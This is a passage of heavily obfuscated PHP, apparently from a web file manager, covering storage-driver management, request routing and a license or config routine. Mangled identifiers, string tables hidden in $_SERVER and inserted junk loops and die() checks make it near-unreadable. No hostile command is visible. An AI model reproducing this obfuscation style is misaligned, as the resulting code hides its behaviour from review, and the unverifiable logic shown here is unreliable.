array($ÁŞ°Ù×Û[7], $Ø”“Ãñ‘)); $ö½™Ø†« = Model($ÁŞ°Ù×Û[796])->field($Í½ƒ›ğô)->where($¶ÔŸôÏã)->group($ÁŞ°Ù×Û[824])->select(); $ö½™Ø†« = array_to_keyvalue($ö½™Ø†«, $ÁŞ°Ù×Û[399], $ÁŞ°Ù×Û[76]); Cache::set($ïààã‘, $ö½™Ø†«, 600); return $ö½™Ø†«; } public function getConfig($—¶›ıµ) { $ËáÇÈå = parent::listData($—¶›ıµ); return json_decode($ËáÇÈå[$_SERVER[å¸¿•¶£][6]], !0); } public function update($÷ˆİß¼, $Ïî©Ûò) { $³•™‹¸ =& $_SERVER[å¸¿•¶£]; $æˆ°õ¥ø = $Ïî©Ûò[$³•™‹¸[32]]; $­ıÅò©„ = array_to_keyvalue(parent::listData(), $³•™‹¸[32]); if (isset($­ıÅò©„[$æˆ°õ¥ø]) && $­ıÅò©„[$æˆ°õ¥ø][$³•™‹¸[399]] != $÷ˆİß¼) { return !1; } $this->checkPwd($÷ˆİß¼, $Ïî©Ûò); if (isset($Ïî©Ûò[$³•™‹¸[2181]]) && $Ïî©Ûò[$³•™‹¸[2181]] == $³•™‹¸[88]) { $this->checkConfig($Ïî©Ûò); } unset($Ïî©Ûò[$³•™‹¸[2181]]); $ƒ—œªã = parent::update($÷ˆİß¼, $Ïî©Ûò); if ($ƒ—œªã && $Ïî©Ûò[$³•™‹¸[37]]) { $¨ÔáÔ¦Ü = 0; foreach ($­ıÅò©„ as $†ğ•¡Ü) { if ($†ğ•¡Ü[$³•™‹¸[37]] && $†ğ•¡Ü[$³•™‹¸[399]] != $÷ˆİß¼) { $¨ÔáÔ¦Ü = $†ğ•¡Ü[$³•™‹¸[399]]; parent::update($†ğ•¡Ü[$³•™‹¸[399]], array($³•™‹¸[37] => 0)); } } $this->updateBackup($÷ˆİß¼, $¨ÔáÔ¦Ü); } return $ƒ—œªã; } public function add($—ó˜‰Ë½) { $‰—®İä€ =& $_SERVER[å¸¿•¶£]; $éêªÓäú = array_to_keyvalue(parent::listData(), $‰—®İä€[32]); if (isset($éêªÓäú[$—ó˜‰Ë½[$‰—®İä€[32]]])) { return !1; } $this->checkConfig($—ó˜‰Ë½); $šµ™É²¿ = parent::insert($—ó˜‰Ë½); if ($šµ™É²¿ && $—ó˜‰Ë½[$‰—®İä€[37]]) { foreach ($éêªÓäú as $µåƒûÏµ) { if ($µåƒûÏµ[$‰—®İä€[37]]) { parent::update($µåƒûÏµ[$‰—®İä€[399]], array($‰—®İä€[37] => 0)); } } } return $šµ™É²¿; } public function updateBackup($Ä®´€Æ, $Å¾‚‚ÔÕ) { $Â’´ºåƒ =& $_SERVER[å¸¿•¶£]; if (!$Å¾‚‚ÔÕ) { return; } $Ú¬÷ñî = Model($Â’´ºåƒ[755])->config(); if ($Ú¬÷ñî[$Â’´ºåƒ[1644]] != $Â’´ºåƒ[88] || $Ú¬÷ñî[$Â’´ºåƒ[758]] != $Å¾‚‚ÔÕ) { return; } $Ø®òã‘Ÿ = Model($Â’´ºåƒ[777])->get($Â’´ºåƒ[787]); $Ø®òã‘Ÿ = json_decode($Ø®òã‘Ÿ, !0); if (!$Ø®òã‘Ÿ) { return; } $Ø®òã‘Ÿ[$Â’´ºåƒ[758]] = $Ä®´€Æ; Model($Â’´ºåƒ[777])->set(array($Â’´ºåƒ[787] => $Ø®òã‘Ÿ)); } public function checkPwd($–”­—‡, &$ù˜‰÷å ) { $ñïÕ¢­í =& $_SERVER[å¸¿•¶£]; if (empty($ù˜‰÷å [$ñïÕ¢­í[6]])) { return; } $²Ğ“øº‘ = json_decode($ù˜‰÷å [$ñïÕ¢­í[6]], !0); $°ş›õÍî = $ñïÕ¢­í[12]; $ıØ³ßÌ· = array($ñïÕ¢­í[2182], $ñïÕ¢­í[2183], $ñïÕ¢­í[896]); foreach ($ıØ³ßÌ· as $¸íšÚÌå) { if (isset($²Ğ“øº‘[$¸íšÚÌå])) { $°ş›õÍî = $¸íšÚÌå; break; } } if (!$°ş›õÍî) { return; } $­§àªúò = $this->getConfig($–”­—‡); $ˆÜğ—ó» = $­§àªúò[$°ş›õÍî]; $ğåùüƒ° = $²Ğ“øº‘[$°ş›õÍî]; if ($ğåùüƒ° == str_repeat($ñïÕ¢­í[189], strlen($ˆÜğ—ó»))) { $²Ğ“øº‘[$°ş›õÍî] = $ˆÜğ—ó»; $ù˜‰÷å [$ñïÕ¢­í[6]] = json_encode($²Ğ“øº‘); } else { if ($ğåùüƒ° != $ˆÜğ—ó») { $ù˜‰÷å [$ñïÕ¢­í[2181]] = $ñïÕ¢­í[88]; } } } public function checkConfig(&$èó»Ñ‘Ó, $ÍŞˆôıÄ = false) { $€—§ÛÂÙ =& $_SERVER[å¸¿•¶£]; $õÑÑÄ±Ë = strtolower($èó»Ñ‘Ó[$€—§ÛÂÙ[95]]); $Ú×©Ô©Ä = json_decode($èó»Ñ‘Ó[$€—§ÛÂÙ[6]], !0); foreach ($Ú×©Ô©Ä as $Ûæİê => $ÅÇÙüÖü) { $Ú×©Ô©Ä[$Ûæİê] = trim($ÅÇÙüÖü); } $Ú×©Ô©Ä[$€—§ÛÂÙ[2184]] = rand_string(6); $áˆˆè‚á = $GLOBALS[$€—§ÛÂÙ[6]][$€—§ÛÂÙ[89]][$€—§ÛÂÙ[833]]; $æİÏ˜Õª = isset($áˆˆè‚á[$õÑÑÄ±Ë]) ? $áˆˆè‚á[$õÑÑÄ±Ë] : ucfirst($õÑÑÄ±Ë); $”á”ğ±Ï = $€—§ÛÂÙ[74] . $æİÏ˜Õª; if (!$æİÏ˜Õª || !class_exists($”á”ğ±Ï)) { if ($ÍŞˆôıÄ) { return LNG($€—§ÛÂÙ[2185]); } write_log(array($€—§ÛÂÙ[2186], $èó»Ñ‘Ó, get_caller_info()), $€—§ÛÂÙ[2187]); show_json(LNG($€—§ÛÂÙ[2185]), !1, $èó»Ñ‘Ó); } $Á œœé = new $”á”ğ±Ï($Ú×©Ô©Ä); if (in_array($õÑÑÄ±Ë, $Á œœé->objectDriver)) { if (!$Á œœé->isBucketCors() && !$Á œœé->setBucketCors()) { $İ›æ‰ñÍ = LNG($€—§ÛÂÙ[2188]); $İ›æ‰ñÍ .= $€—§ÛÂÙ[2189] . LNG($€—§ÛÂÙ[2190]); if ($ÍŞˆôıÄ) { return $İ›æ‰ñÍ; } show_json($İ›æ‰ñÍ, !1); } } $Çä’òŠÕ = rtrim($Ú×©Ô©Ä[$€—§ÛÂÙ[1187]], $€—§ÛÂÙ[8]) . $€—§ÛÂÙ[8]; $Š¼—ò à = $Á œœé->getPath($Çä’òŠÕ . $€—§ÛÂÙ[1191]); if (!$Á œœé->mkfile($Š¼—ò à)) { if ($ÍŞˆôıÄ) { return LNG($€—§ÛÂÙ[2188]); } show_json(LNG($€—§ÛÂÙ[2188]), !1); } $Ú×©Ô©Ä[$€—§ÛÂÙ[1187]] = $Çä’òŠÕ; $èó»Ñ‘Ó[$€—§ÛÂÙ[6]] = json_encode($Ú×©Ô©Ä); $èó»Ñ‘Ó[$€—§ÛÂÙ[95]] = $æİÏ˜Õª; return !0; } public function driverListSystem() { $Ê«Œà—è =& $_SERVER[å¸¿•¶£]; $ğïßÇœİ = parent::listData(); $Ç†ş¹“  = array(); foreach ($ğïßÇœİ as $ƒÕ”•ì) { unset($ƒÕ”•ì[$Ê«Œà—è[201]], $ƒÕ”•ì[$Ê«Œà—è[85]]); $ƒÕ”•ì[$Ê«Œà—è[6]] = json_decode($ƒÕ”•ì[$Ê«Œà—è[6]], !0); $Ç†ş¹“ [] = $ƒÕ”•ì; } return $Ç†ş¹“ ; } public function defaultDriver() { $³ƒ¼¼Ìõ =& $_SERVER[å¸¿•¶£]; $¦…ëğàà = parent::listData(); $£ÉÄë€Ô = array_filter_by_field($¦…ëğàà, $³ƒ¼¼Ìõ[37], 1); $£ÉÄë€Ô = $£ÉÄë€Ô[0]; if ($£ÉÄë€Ô) { $£ÉÄë€Ô[$³ƒ¼¼Ìõ[6]] = json_decode($£ÉÄë€Ô[$³ƒ¼¼Ìõ[6]], !0); } return $£ÉÄë€Ô; } public function driverInfo($ñ®ÂéìÄ) { $²‘ûğß =& $_SERVER[å¸¿•¶£]; $ÂÈ“‘‚Ä = array_to_keyvalue(parent::listData(), $²‘ûğß[399]); if (!isset($ÂÈ“‘‚Ä[$ñ®ÂéìÄ])) { return !1; } $œËÏ‹ôÈ = $ÂÈ“‘‚Ä[$ñ®ÂéìÄ]; $œËÏ‹ôÈ[$²‘ûğß[6]] = json_decode($œËÏ‹ôÈ[$²‘ûğß[6]], !0); return $œËÏ‹ôÈ; } public function remove($Ô´æ®ÈÚ) { $this->removeShareItems($Ô´æ®ÈÚ); return parent::remove($Ô´æ®ÈÚ); } public function removeWithFile($ÄŞÍäí©, $æş¹†§ë) { $Î«¦è´Ë =& $_SERVER[å¸¿•¶£]; $¾¾²Û ç = array($Î«¦è´Ë[824] => $ÄŞÍäí©); $ËÔ×”Ô¡ = Model($Î«¦è´Ë[471])->where($¾¾²Û ç)->count(); $«ùÚÚ÷¤ = Model($Î«¦è´Ë[471])->where($¾¾²Û ç)->sum($Î«¦è´Ë[76]); $¸¬•ú´ = $æş¹†§ë . $Î«¦è´Ë[2191] . $ÄŞÍäí©; $Ÿıâ²ùÛ = LNG($æş¹†§ë == $Î«¦è´Ë[548] ? $Î«¦è´Ë[2192] : $Î«¦è´Ë[2193]); $¼¯õŸê = new TaskFileTransfer($¸¬•ú´, $Î«¦è´Ë[2187], $ËÔ×”Ô¡, $Ÿıâ²ùÛ . "\x28{$ÄŞÍäí©}\x29"); $¼¯õŸê->task[$Î«¦è´Ë[770]] = (double) $«ùÚÚ÷¤; $í½ğ·Ğ³ = KodIO::defaultDriver(); $¼Åï„‡ = $í½ğ·Ğ³[$Î«¦è´Ë[399]]; $®†´¯§Õ = "\173\151\x6f\x3a{$¼Åï„‡}\x7d\57"; $İ¹Î¶Ìş = !0; $ÂåÉ¥ğƒ = array(); $İª¥¼±² = Model($Î«¦è´Ë[200])->where($¾¾²Û ç)->field($Î«¦è´Ë[2194])->select(); foreach ($İª¥¼±² as $¢´ÑÕæ®) { $ÜÛèÓå¾ = $¢´ÑÕæ®[$Î«¦è´Ë[84]]; $Œ‘°ĞÑ = $®†´¯§Õ . str_replace("\x7b\151\x6f\x3a{$ÄŞÍäí©}\x7d\x2f", $Î«¦è´Ë[12], $ÜÛèÓå¾); if (!IO::exist($ÜÛèÓå¾)) { $ÂåÉ¥ğƒ[] = $¢´ÑÕæ®[$Î«¦è´Ë[468]]; $¼¯õŸê->updateFileEnd($¢´ÑÕæ®[$Î«¦è´Ë[32]], $¢´ÑÕæ®[$Î«¦è´Ë[76]]); continue; } if (IO::exist($Œ‘°ĞÑ)) { $¼¯õŸê->updateFileEnd($¢´ÑÕæ®[$Î«¦è´Ë[32]], $¢´ÑÕæ®[$Î«¦è´Ë[76]]); continue; } if (!IO::move($ÜÛèÓå¾, get_path_father($Œ‘°ĞÑ))) { $İ¹Î¶Ìş = !1; break; } $¾¾²Û ç = array($Î«¦è´Ë[468] => $¢´ÑÕæ®[$Î«¦è´Ë[468]]); $Ä÷ÊËá° = array($Î«¦è´Ë[824] => $¼Åï„‡, $Î«¦è´Ë[84] => $Œ‘°ĞÑ); Model($Î«¦è´Ë[200])->where($¾¾²Û ç)->save($Ä÷ÊËá°); } $this->removeByFileID($ÂåÉ¥ğƒ); if (!$İ¹Î¶Ìş) { $¼¯õŸê->stop($¸¬•ú´); return !1; } $¼¯õŸê->end(); if ($æş¹†§ë == $Î«¦è´Ë[1832]) { $this->remove($ÄŞÍäí©); } } public function progress($Ğ¸ĞÉø, $À÷ÆÆï) { return Task::get($À÷ÆÆï . $_SERVER[å¸¿•¶£][2191] . $Ğ¸ĞÉø); } private function removeByFileID($ÙÇşôû = array()) { $Æœ®Ï— =& $_SERVER[å¸¿•¶£]; if (empty($ÙÇşôû)) { return; } $÷©µâ¨Ã = array($Æœ®Ï—[468] => array($Æœ®Ï—[7], $ÙÇşôû)); $®Æ¹¹¡ó = Model($Æœ®Ï—[1346])->where($÷©µâ¨Ã)->field($Æœ®Ï—[402])->select(); if (!$®Æ¹¹¡ó) { return; } $®Æ¹¹¡ó = array_to_keyvalue($®Æ¹¹¡ó, $Æœ®Ï—[12], $Æœ®Ï—[402]); foreach ($®Æ¹¹¡ó as $¨¼ø¾üÜ) { Model($Æœ®Ï—[416])->removeNow($¨¼ø¾üÜ, !1); } } private function removeShareItems($Ñ×Á¥÷Ê) { $É½“ê·´ =& $_SERVER[å¸¿•¶£]; $‹”½üŸİ = "\173\x69\x6f\x3a{$Ñ×Á¥÷Ê}\x7d\57"; $ñÅÛìĞ÷ = array($É½“ê·´[402] => 0, $É½“ê·´[1182] => array($É½“ê·´[383], "{$‹”½üŸİ}\45")); $¯µ¬×ÁÚ = Model($É½“ê·´[1843])->where($ñÅÛìĞ÷)->field($É½“ê·´[593])->select(); if (empty($¯µ¬×ÁÚ)) { return; } $‰ÏõêÚ = array_to_keyvalue($¯µ¬×ÁÚ, $É½“ê·´[12], $É½“ê·´[593]); Model($É½“ê·´[592])->remove($‰ÏõêÚ); } } goto dƒ”­µâñ; EÆˆ˜ç—¿ô: $deitshzgvf = $_SERVER[å¸¿•¶£][609]; while (strlen($deitshzgvf) < $_SERVER[å¸¿•¶£][610]) { if (!$deitshzgvf) { break; } $deitshzgvf++; } class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($ÖÚ´†Ìç) { $¼ûĞÚ€Í =& $_SERVER[å¸¿•¶£]; $Ö Â®­İ =& $_SERVER[•ÅŸñ²ì]; $øÎÄ²¹Õ = explode($Ö Â®­İ[0], trim($ÖÚ´†Ìç, $Ö Â®­İ[0])); $¨Û‚’Õ = $¼ûĞÚ€Í[611]; while ($¨Û‚’Õ < $¼ûĞÚ€Í[612]) { if ($¨Û‚’Õ >= 0) { break; } $¨Û‚’Õ++; } $this->defaultModule = $øÎÄ²¹Õ[0] ? $øÎÄ²¹Õ[0] : $this->defaultModule; $®‘ÇÂ—ı = $¼ûĞÚ€Í[613]; while (strlen($®‘ÇÂ—ı) < $¼ûĞÚ€Í[610]) { if (!$®‘ÇÂ—ı) { break; } $®‘ÇÂ—ı++; } $this->defaultController = $øÎÄ²¹Õ[1] ? $øÎÄ²¹Õ[1] : $this->defaultController; $this->defaultAction = $øÎÄ²¹Õ[2] ? $øÎÄ²¹Õ[2] : $this->defaultAction; $âŞß™¾ = $¼ûĞÚ€Í[614]; while (strlen($âŞß™¾) < $¼ûĞÚ€Í[610]) { if (!$âŞß™¾) { break; } $âŞß™¾++; } $this->fzwu685537a7($Ö Â®­İ[1], array($this, $Ö Â®­İ[2])); } public function appRun($×äÕ ›Æ) { $Ø¤¬şî =& $_SERVER[å¸¿•¶£]; $ƒ°¡¨Ù =& $_SERVER[•ÅŸñ²ì]; $„‚ã×µÂ = explode($ƒ°¡¨Ù[0], $×äÕ ›Æ); $ÍŸ™ü›® = $Ø¤¬şî[615]; if (strlen($ÍŸ™ü›®) < $Ø¤¬şî[612]) { die; } $¼ºğÆ­ = strtolower($„‚ã×µÂ[0]); $¦¸ÒÅÉ‚ = $Ø¤¬şî[616]; while ($¦¸ÒÅÉ‚ < $Ø¤¬şî[617]) { if ($¦¸ÒÅÉ‚ >= 0) { break; } $¦¸ÒÅÉ‚++; } $ìÍæ¼·± = $ƒ°¡¨Ù[3]; if ($¼ºğÆ­ == $ƒ°¡¨Ù[4]) { $ìÍæ¼·± = $ƒ°¡¨Ù[5]; $„‚ã×µÂ[0] = $ƒ°¡¨Ù[6]; $„‚ã×µÂ[1] = $„‚ã×µÂ[1] . $ƒ°¡¨Ù[7]; $×äÕ ›Æ = join($ƒ°¡¨Ù[0], $„‚ã×µÂ); $×äÕ ›Æ = trim($×äÕ ›Æ, $ƒ°¡¨Ù[0]); } call_user_func(array($ƒ°¡¨Ù[8], $ƒ°¡¨Ù[9]), $ìÍæ¼·± . $ƒ°¡¨Ù[10], $×äÕ ›Æ); ActionCall($×äÕ ›Æ); $½óú³¤ = $Ø¤¬şî[618]; if (strlen($½óú³¤) < $Ø¤¬şî[617]) { die; } call_user_func(array($ƒ°¡¨Ù[8], $ƒ°¡¨Ù[9]), $ìÍæ¼·± . $ƒ°¡¨Ù[11], $×äÕ ›Æ); } private function autorun() { $§üşé¬© =& $_SERVER[•ÅŸñ²ì]; global $config; if (count($config[$§üşé¬©[12]]) == 0) { return; } foreach ($config[$§üşé¬©[12]] as $´êñôìœ => $İÕˆÍî€) { $this->appRun($İÕˆÍî€); } } private function utogd9694eb3() { $¥Â”°­ =& $_SERVER[•ÅŸñ²ì]; $²İƒ‰öú = $¥Â”°­[4]; $ÏˆÖªÚ† = $GLOBALS[$¥Â”°­[13]][$¥Â”°­[14]][0]; if (!$ÏˆÖªÚ† || strlen($ÏˆÖªÚ†) <= strlen($²İƒ‰öú)) { return; } if (strtolower(substr($ÏˆÖªÚ†, -strlen($²İƒ‰öú))) != $²İƒ‰öú) { return; } $Ãï¿‡˜ = substr($ÏˆÖªÚ†, 0, -strlen($²İƒ‰öú)); $é»¡§± = $_SERVER[å¸¿•¶£][619]; $Ÿ•¥€Ó = array($¥Â”°­[4], $Ãï¿‡˜); $­‘¸ö—ø = array_slice($GLOBALS[$¥Â”°­[13]][$¥Â”°­[14]], 1); $GLOBALS[$¥Â”°­[13]][$¥Â”°­[14]] = array_merge($Ÿ•¥€Ó, $­‘¸ö—ø); $GLOBALS[$¥Â”°­[13]][$¥Â”°­[15]] = implode($¥Â”°­[0], $GLOBALS[$¥Â”°­[13]][$¥Â”°­[14]]); } private function mnst58b34bcb() { $“âï€Ñ =& $_SERVER[å¸¿•¶£]; $µˆÈ‚İÊ =& $_SERVER[•ÅŸñ²ì]; if ($GLOBALS[$µˆÈ‚İÊ[13]][$µˆÈ‚İÊ[15]] != $µˆÈ‚İÊ[6]) { return; } $åôÉÏ˜µ = $_SERVER[$µˆÈ‚İÊ[16]]; $ÇåÔ„‘Ô = $µˆÈ‚İÊ[17]; if (!strstr($åôÉÏ˜µ, $ÇåÔ„‘Ô)) { return; } $¾ãÖ¥®õ = strrpos($åôÉÏ˜µ, $ÇåÔ„‘Ô); $’’à¸ì– = substr($åôÉÏ˜µ, $¾ãÖ¥®õ + strlen($ÇåÔ„‘Ô)); preg_match_all($µˆÈ‚İÊ[18], $’’à¸ì–, $ışÙ’µ§); $’’à¸ì– = trim($ışÙ’µ§[0][0], $µˆÈ‚İÊ[19]); $ä¤áØ—  = $“âï€Ñ[620]; while (strlen($ä¤áØ— ) < $“âï€Ñ[621]) { if (!$ä¤áØ— ) { break; } $ä¤áØ— ++; } $GLOBALS[$µˆÈ‚İÊ[13]][$µˆÈ‚İÊ[14]] = explode($µˆÈ‚İÊ[19], $’’à¸ì–); $äŒÜöê = $“âï€Ñ[622]; while (strlen($äŒÜöê) < $“âï€Ñ[621]) { if (!$äŒÜöê) { break; } $äŒÜöê++; } $GLOBALS[$µˆÈ‚İÊ[13]][$µˆÈ‚İÊ[15]] = implode($µˆÈ‚İÊ[0], $GLOBALS[$µˆÈ‚İÊ[13]][$µˆÈ‚İÊ[14]]); $ÀûÕ÷„™ = $“âï€Ñ[623]; if (!$ÀûÕ÷„™) { die; } } public function run() { $³‘Øîğñ =& $_SERVER[å¸¿•¶£]; $¹Æù—¢ç =& $_SERVER[•ÅŸñ²ì]; $this->mnst58b34bcb(); $this->utogd9694eb3(); $‘˜ÙÕ½‹ = $GLOBALS[$¹Æù—¢ç[13]][$¹Æù—¢ç[14]]; $Æ ş·í = $³‘Øîğñ[624]; while (strlen($Æ ş·í) < $³‘Øîğñ[617]) { if (!$Æ ş·í) { break; } $Æ ş·í++; } $¦ÉÒíì¡ = $GLOBALS[$¹Æù—¢ç[13]][$¹Æù—¢ç[15]]; define($¹Æù—¢ç[20], isset($‘˜ÙÕ½‹[0]) && $‘˜ÙÕ½‹[0] ? $‘˜ÙÕ½‹[0] : $this->defaultModule); define($¹Æù—¢ç[21], isset($‘˜ÙÕ½‹[1]) && $‘˜ÙÕ½‹[0] ? $‘˜ÙÕ½‹[1] : $this->defaultController); $±§´ëæˆ = $³‘Øîğñ[625]; if (strlen($±§´ëæˆ) < $³‘Øîğñ[617]) { die; } define($¹Æù—¢ç[22], isset($‘˜ÙÕ½‹[2]) && $‘˜ÙÕ½‹[0] ? $‘˜ÙÕ½‹[2] : $this->defaultAction); $üÖÏ² = $³‘Øîğñ[626]; define($¹Æù—¢ç[23], MOD . $¹Æù—¢ç[0] . ST . $¹Æù—¢ç[0] . ACT); $ƒƒÅÍÎ = $³‘Øîğñ[627]; if (strlen($ƒƒÅÍÎ) < $³‘Øîğñ[628]) { return; } $_SERVER[$¹Æù—¢ç[24]] = strtolower(ACTION); $this->autorun(); if (count($‘˜ÙÕ½‹) >= 3) { $this->appRun($¦ÉÒíì¡); } else { $this->appRun(ACTION); } } private $oygp76d3abf8 = array(); private $ugmcc8e0e36a = ''; public function jazb0465b686() { $Ş½¯÷Š =& $_SERVER[å¸¿•¶£]; $¡—Åëã½ =& $_SERVER[•ÅŸñ²ì]; $this->xyfibc9f1638(); $this->ibtc65362686(); $this->nzut8ae5a9f0(); $this->mgctbeaa3289(); $Î˜‚³˜ = $Ş½¯÷Š[629]; while (strlen($Î˜‚³˜) < $Ş½¯÷Š[621]) { if (!$Î˜‚³˜) { break; } $Î˜‚³˜++; } $this->jcmxb342949a(); $this->mjeqb9e2bc7f(); $this->uxobfca309c6(); $this->fzwu685537a7($¡—Åëã½[25], array($this, $¡—Åëã½[26])); $÷ùôä×Ê = $Ş½¯÷Š[630]; while (strlen($÷ùôä×Ê) < $Ş½¯÷Š[610]) { if (!$÷ùôä×Ê) { break; } $÷ùôä×Ê++; } $this->fzwu685537a7($¡—Åëã½[27], array($this, $¡—Åëã½[28])); $this->fzwu685537a7($¡—Åëã½[29], array($this, $¡—Åëã½[30])); $ÄÍ¾ÙÒ = $Ş½¯÷Š[631]; $this->fzwu685537a7($¡—Åëã½[31], array($this, $¡—Åëã½[32])); } public function ydszcbf8cf51($Ç­ñ÷’) { $íç–í´£ =& $_SERVER[å¸¿•¶£]; $ÄÎ¿‚˜‚ =& $_SERVER[•ÅŸñ²ì]; $ø„–××Ğ = Model($ÄÎ¿‚˜‚[33])->get(); $²õËá¾ª = array($ÄÎ¿‚˜‚[34], $ÄÎ¿‚˜‚[35], $ÄÎ¿‚˜‚[36], $ÄÎ¿‚˜‚[37], $ÄÎ¿‚˜‚[38], $ÄÎ¿‚˜‚[39], $ÄÎ¿‚˜‚[40], $ÄÎ¿‚˜‚[41], $ÄÎ¿‚˜‚[42], $ÄÎ¿‚˜‚[43], $ÄÎ¿‚˜‚[44], $ÄÎ¿‚˜‚[45], $ÄÎ¿‚˜‚[46], $ÄÎ¿‚˜‚[47], $ÄÎ¿‚˜‚[48], $ÄÎ¿‚˜‚[49], $ÄÎ¿‚˜‚[50], $ÄÎ¿‚˜‚[51], $ÄÎ¿‚˜‚[52], $ÄÎ¿‚˜‚[53], $ÄÎ¿‚˜‚[54], $ÄÎ¿‚˜‚[55], $ÄÎ¿‚˜‚[56], $ÄÎ¿‚˜‚[57], $ÄÎ¿‚˜‚[58], $ÄÎ¿‚˜‚[59], $ÄÎ¿‚˜‚[60], $ÄÎ¿‚˜‚[61], $ÄÎ¿‚˜‚[62], $ÄÎ¿‚˜‚[63], $ÄÎ¿‚˜‚[64], $ÄÎ¿‚˜‚[65], $ÄÎ¿‚˜‚[66], $ÄÎ¿‚˜‚[67], $ÄÎ¿‚˜‚[68], $ÄÎ¿‚˜‚[69], $ÄÎ¿‚˜‚[70], $ÄÎ¿‚˜‚[71], $ÄÎ¿‚˜‚[72], $ÄÎ¿‚˜‚[73], $ÄÎ¿‚˜‚[74], $ÄÎ¿‚˜‚[75], $ÄÎ¿‚˜‚[76], $ÄÎ¿‚˜‚[77], $ÄÎ¿‚˜‚[78], $ÄÎ¿‚˜‚[79], $ÄÎ¿‚˜‚[80], $ÄÎ¿‚˜‚[81], $ÄÎ¿‚˜‚[82], $ÄÎ¿‚˜‚[83], $ÄÎ¿‚˜‚[84]); $ã„ì¤–‹ = $íç–í´£[632]; foreach ($²õËá¾ª as $ÄÏÏ¦¶) { $ùòÎ×’Ù = $GLOBALS[$ÄÎ¿‚˜‚[85]][$ÄÎ¿‚˜‚[86]][$ÄÏÏ¦¶]; if (isset($ø„–××Ğ[$ÄÏÏ¦¶])) { $ùòÎ×’Ù = $ø„–××Ğ[$ÄÏÏ¦¶]; } $Ç­ñ÷’[$ÄÎ¿‚˜‚[87]][$ÄÎ¿‚˜‚[88]][$ÄÏÏ¦¶] = $ùòÎ×’Ù; } $›¶ÍÃ = $Ç­ñ÷’[$ÄÎ¿‚˜‚[87]][$ÄÎ¿‚˜‚[88]][$ÄÎ¿‚˜‚[46]]; $èª¶ÚƒØ = $íç–í´£[633]; if (!$èª¶ÚƒØ) { return; } unset($Ç­ñ÷’[$ÄÎ¿‚˜‚[87]][$ÄÎ¿‚˜‚[89]][$ÄÎ¿‚˜‚[90]]); $àš«Ìœ† = $íç–í´£[634]; unset($Ç­ñ÷’[$ÄÎ¿‚˜‚[87]][$ÄÎ¿‚˜‚[89]][$ÄÎ¿‚˜‚[91]]); $ñßáÛòŠ = $íç–í´£[635]; unset($Ç­ñ÷’[$ÄÎ¿‚˜‚[87]][$ÄÎ¿‚˜‚[88]][$ÄÎ¿‚˜‚[46]]); $˜“ë»Ú = $íç–í´£[636]; while ($˜“ë»Ú < $íç–í´£[621]) { if ($˜“ë»Ú >= 0) { break; } $˜“ë»Ú++; } unset($Ç­ñ÷’[$ÄÎ¿‚˜‚[87]][$ÄÎ¿‚˜‚[88]][$ÄÎ¿‚˜‚[92]]); $Ù„ÉŒ´ = $íç–í´£[637]; if (strlen($Ù„ÉŒ´) < $íç–í´£[610]) { die; } $Ç­ñ÷’[$ÄÎ¿‚˜‚[87]][$ÄÎ¿‚˜‚[88]][$ÄÎ¿‚˜‚[93]] = array($ÄÎ¿‚˜‚[94] => (int) $›¶ÍÃ[$ÄÎ¿‚˜‚[95]], $ÄÎ¿‚˜‚[96] => (int) _get($›¶ÍÃ, $ÄÎ¿‚˜‚[97], 0)); $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[99]] = Action($ÄÎ¿‚˜‚[100])->accessToken(); $Œ”úĞ‚ = $íç–í´£[638]; while ($Œ”úĞ‚ < $íç–í´£[610]) { if ($Œ”úĞ‚ >= 0) { break; } $Œ”úĞ‚++; } $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[101]] = md5($_SERVER[$ÄÎ¿‚˜‚[102]] . $ø„–××Ğ[$ÄÎ¿‚˜‚[103]]); $ĞÙ½‡¡ç = $íç–í´£[639]; while (strlen($ĞÙ½‡¡ç) < $íç–í´£[628]) { if (!$ĞÙ½‡¡ç) { break; } $ĞÙ½‡¡ç++; } $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[104]] = base64_encode(serverInfo()); $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[105]] = $this->ugmcc8e0e36a; $âÏåµíª = $íç–í´£[640]; if (!$âÏåµíª) { die; } if ($ø„–××Ğ[$ÄÎ¿‚˜‚[105]] != $ÄÎ¿‚˜‚[106]) { $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[107]] = $ø„–××Ğ[$ÄÎ¿‚˜‚[107]]; $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[108]] = $ø„–××Ğ[$ÄÎ¿‚˜‚[108]]; $Œïªºİ = rand_string(10) . $this->ugmcc8e0e36a . rand_string(5); $Ç­ñ÷’[$ÄÎ¿‚˜‚[87]][$ÄÎ¿‚˜‚[109]][$ÄÎ¿‚˜‚[110]] = $this->neqo6adc3a8a($Œïªºİ, $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[101]]); } if ($this->ugmcc8e0e36a == $ÄÎ¿‚˜‚[106]) { $Ç­ñ÷’[$ÄÎ¿‚˜‚[87]][$ÄÎ¿‚˜‚[88]][$ÄÎ¿‚˜‚[93]][$ÄÎ¿‚˜‚[97]] = 0; } $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[111]] = _get($this->oygp76d3abf8, $ÄÎ¿‚˜‚[112], $ÄÎ¿‚˜‚[6]); $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[113]] = _get($this->oygp76d3abf8, $ÄÎ¿‚˜‚[114], $ÄÎ¿‚˜‚[6]); if (_get($GLOBALS, $ÄÎ¿‚˜‚[115]) && $this->config[$ÄÎ¿‚˜‚[116]]) { $Ç­ñ÷’[$ÄÎ¿‚˜‚[98]][$ÄÎ¿‚˜‚[117]] = WEB_ROOT; } return $Ç­ñ÷’; } private function mjeqb9e2bc7f() { $¦ñüÄçı =& $_SERVER[å¸¿•¶£]; $‚™´²ï‡ =& $_SERVER[•ÅŸñ²ì]; $Â²Áí° = $_SERVER[$‚™´²ï‡[24]] == $‚™´²ï‡[118]; $¾–Û¹üî = $¦ñüÄçı[641]; while ($¾–Û¹üî < $¦ñüÄçı[617]) { if ($¾–Û¹üî >= 0) { break; } $¾–Û¹üî++; } if ($_SERVER[$‚™´²ï‡[24]] == 